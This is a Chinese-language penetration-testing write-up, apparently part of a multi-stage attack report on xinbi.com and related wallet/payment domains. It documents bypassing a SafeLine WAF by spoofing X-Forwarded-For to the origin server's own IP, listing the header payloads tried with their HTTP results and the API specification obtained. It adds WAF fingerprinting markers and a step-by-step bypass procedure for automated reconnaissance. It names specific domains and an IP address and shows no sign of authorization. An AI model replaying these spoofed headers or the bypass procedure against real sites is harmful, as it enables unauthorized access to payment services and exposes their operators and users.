# SafeLine WAF XFF 自身 IP 绕过白名单 — xinbi.com 实战

> 来源：xinbi.com 20 阶段全链渗透报告 P5-01

## 场景

`integrate-safew.xspay.vip`（Wallet API 集成环境）对所有请求返回 **403**（SafeLine 拦截）。
通过伪造 `X-Forwarded-For` 为**源站自身 IP** 即可完全绕过。

## 发现过程

```
# 常规绕过尝试（全部 403）
X-Forwarded-For: 127.0.0.1          → 403
X-Forwarded-For: 10.0.0.1           → 403
X-Real-IP: 126.214.108.58           → 403
CF-Connecting-IP: 126.214.108.58    → 403
True-Client-IP: 126.214.108.58      → 403
Forwarded: for=126.214.108.58       → 403
Googlebot UA                        → 403
/./  //  /%2e/                      → 403

# 关键发现：源站自身 IP
X-Forwarded-For: 126.214.108.58     → **200（放行！）**
```

## 根因

SafeLine 配置了基于 `X-Forwarded-For` 的 IP 白名单。
白名单包含**源站自身 IP**（126.214.108.58），用于允许「来自自身的内部请求」。
但 XFF 头可由任何外部请求伪造 → 任何人都能冒充「内部流量」绕过访问控制。

## 对比：同一架构下不同 vhost 的 WAF 行为差异

| vhost | WAF 行为 | XFF 绕过 |
|-------|---------|---------|
| `integrate-safew.xspay.vip` | 403 + event_id | ✅ 源站自身 IP 可绕过 |
| `main-agent.xbpay.vip` | **467** SafeLine 身份认证页 | ❌ 所有 XFF 仍返回 467 |
| `xinbi.com` | SafeLine 反爬 + 速率限制（429 持续 40 分钟） | ❌ |

→ **SafeLine 不同 vhost 的 XFF 信任策略可以不同**。一个 vhost 可绕不代表全部可绕。

## 绕过后得到的内容

- 完整 OpenAPI 3.1 YAML（80,608B），17 个 Wallet API 接口 + 全部 DTO
- 包括：`/safew/register`、`/safew/wallet-info`、`/safew/verify-payment`、`/safew/set-pwd`、`/safew/send-redpacket` 等
- 鉴权仍有效（RSA 签名），但接口参数结构完全暴露

## SafeLine 指纹识别

```
# SafeLine 特征
Set-Cookie: sl-session=...; Path=/; Max-Age=86400; HttpOnly
响应头: sl-antibot: html@1;id@186;
拦截页: /.safeline/static/favicon.png
页面元素: #slg-* 、window.product_data
403 页: Access Denied<!-- event_id: <32hex> -->

# SafeLine 身份认证模式（467）
状态码: 467（非标准）
认证接口: /.safeline/auth/api/auth（账号密码）
         /.safeline/auth/api/auth/ldap
         /.safeline/auth/api/user/auth/totp（TOTP 二次验证）
SSO: dingtalk / github / oidc / qy_weixin / wechat / cas
JS: /.safeline/static/auth.js（46KB）
Cookie: sl_auth_info=...
```

## 测绘引擎适配

遇到 SafeLine WAF 时：
1. 先识别 vhost 是 403（规则拦截）还是 467（身份认证）— 两种模式绕过路径不同
2. 403 模式：尝试 XFF = 源站自身 IP / 内网段 / CF 边缘段
3. 467 模式：需要账号密码或 SSO，XFF 通常无效
4. 两种模式可共存于同一源站的不同 vhost
